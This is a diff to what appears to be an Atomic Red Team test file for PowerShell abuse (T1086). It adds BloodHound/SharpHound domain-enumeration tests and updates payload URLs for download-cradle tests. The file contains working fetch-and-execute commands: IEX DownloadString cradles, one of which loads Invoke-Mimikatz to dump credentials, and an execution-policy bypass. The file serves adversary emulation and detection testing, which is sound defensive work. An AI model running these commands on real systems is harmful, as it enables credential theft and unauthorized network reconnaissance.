@@ -19,9 +19,9 @@ atomic_tests:
     command: |
       powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
 
-- name: SharpHound
+- name: Run BloodHound from local disk 
   description: |
-    Upon execution SharpHound will downloaded and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
+    Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
 
     Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file. 
   supported_platforms:
@@ -34,11 +34,11 @@ atomic_tests:
     file_path:
       description: File path for SharpHound payload
       type: String
-      default: PathToAtomicsFolder\T1086\payloads
+      default: PathToAtomicsFolder\T1086\src
     output_path:
       description: Output path for BloodHound reports
       type: String
-      default: PathToAtomicsFolder\T1086\payloads
+      default: PathToAtomicsFolder\T1086\src
   
   dependency_executor_name: powershell
   dependencies:
@@ -47,20 +47,40 @@ atomic_tests:
       prereq_command: |
         if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else {exit 1}
       get_prereq_command: |
-        Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/SharpHound.ps1" -OutFile "#{file_path}\SharpHound.ps1"
+        Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "#{file_path}\SharpHound.ps1"
 
   executor:
     name: powershell
     elevation_required: true
     command: |
-      write-host "Test 1 - Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
+      write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
       import-module #{file_path}\SharpHound.ps1; invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}
-      write-host "Test 2 - Remote download of SharpHound.ps1, import and execution from $env:temp" -ForegroundColor Cyan
-      Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/SharpHound.ps1 -outfile $env:temp\SharpHound.ps1; import-module $env:temp\SharpHound.ps1; invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}
        
     cleanup_command: |
+      Remove-Item #{file_path}\SharpHound.ps1 -Force
       Remove-Item #{file_path}\*BloodHound.zip -Force
-      Remove-Item $env:temp\SharpHound.ps1 -Force
+
+- name: Run Bloodhound from Memory using Download Cradle
+  description: |
+    Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to #{output_path}. If system is unable to contact a domain, proper execution will not occur.
+
+    Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file. 
+  supported_platforms:
+    - windows
+  input_arguments:
+    output_path:
+      description: Output path for BloodHound reports
+      type: String
+      default: PathToAtomicsFolder\T1086\src
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      write-host "Remote download of SharpHound.ps1, import and execution from $env:temp" -ForegroundColor Cyan
+      powershell -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound -OutputDirectory #{output_path}"
+       
+    cleanup_command: |
+      Remove-Item #{output_path}\*BloodHound.zip -Force
 
 - name: Obfuscation Tests
   description: |
@@ -111,7 +131,7 @@ atomic_tests:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
   executor:
     name: command_prompt
     elevation_required: false
@@ -122,14 +142,14 @@ atomic_tests:
   description: |
     Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.
 
-    Provided by https://github.com/mgreen27/mgreen27.github.i
+    Provided by https://github.com/mgreen27/mgreen27.github.io
   supported_platforms:
     - windows
   input_arguments:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.ps1
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
   executor:
     name: command_prompt
     elevation_required: false
@@ -147,7 +167,7 @@ atomic_tests:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/test.xml
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml
   executor:
     name: command_prompt
     elevation_required: false
@@ -165,7 +185,7 @@ atomic_tests:
     url:
       description: url of payload to execute
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/payloads/mshta.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct
   executor:
     name: command_prompt
     elevation_required: false
